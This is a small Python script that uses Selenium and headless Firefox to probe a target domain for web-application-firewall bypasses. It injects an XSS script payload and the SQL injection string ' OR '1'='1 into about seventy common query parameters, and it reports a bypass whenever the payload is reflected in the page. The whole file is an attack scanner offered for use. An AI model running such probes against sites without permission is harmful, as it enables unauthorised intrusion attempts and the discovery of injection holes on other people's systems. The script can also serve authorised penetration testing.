from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium import webdriver
from colorama import init, Fore, Style


fg = Fore.GREEN
fr = Fore.RED
fw = Fore.WHITE
fy = Fore.YELLOW
fo = Fore.LIGHTYELLOW_EX
flc = Fore.CYAN
bd = Style.BRIGHT
res = Style.RESET_ALL

def test_waf_bypass(domain):
    payloads = ["<script>alert('XSS')</script>", "' OR '1'='1"]
    query_params = [
        "test", "id", "name", "search", "q", "query", "item", "category",
        "product", "page", "user", "username", "email", "login", "pass",
        "password", "type", "sort", "order", "filter", "view", "action",
        "cmd", "command", "module", "path", "file", "filename", "dir",
        "directory", "folder", "content", "data", "date", "time", "year",
        "month", "day", "event", "title", "description", "comment", "message",
        "post", "article", "news", "blog", "forum", "thread", "topic", "board",
        "section", "chapter", "pageid", "postid", "threadid", "articleid",
        "newsid", "blogid", "forumid", "topicid", "boardid", "sectionid",
        "chapterid"
    ]

    options = Options()
    options.headless = True
    driver = webdriver.Firefox(options=options)
    
    try:
        for payload in payloads:
            for param in query_params:
                test_url = f"{domain}/?{param}={payload}"
                driver.get(test_url)
                if payload in driver.page_source:
                    print(f"{fg}{bd}[+] WAF bypassed with payload: {payload} on parameter: {param}{res}")
                else:
                    print(f"{fr}{bd}[-] Payload not detected: {payload} on parameter: {param}{res}")
    except Exception as e:
        print(f"{fr}{bd}[-] Error testing WAF bypass: {e}{res}")
    finally:
        driver.quit()
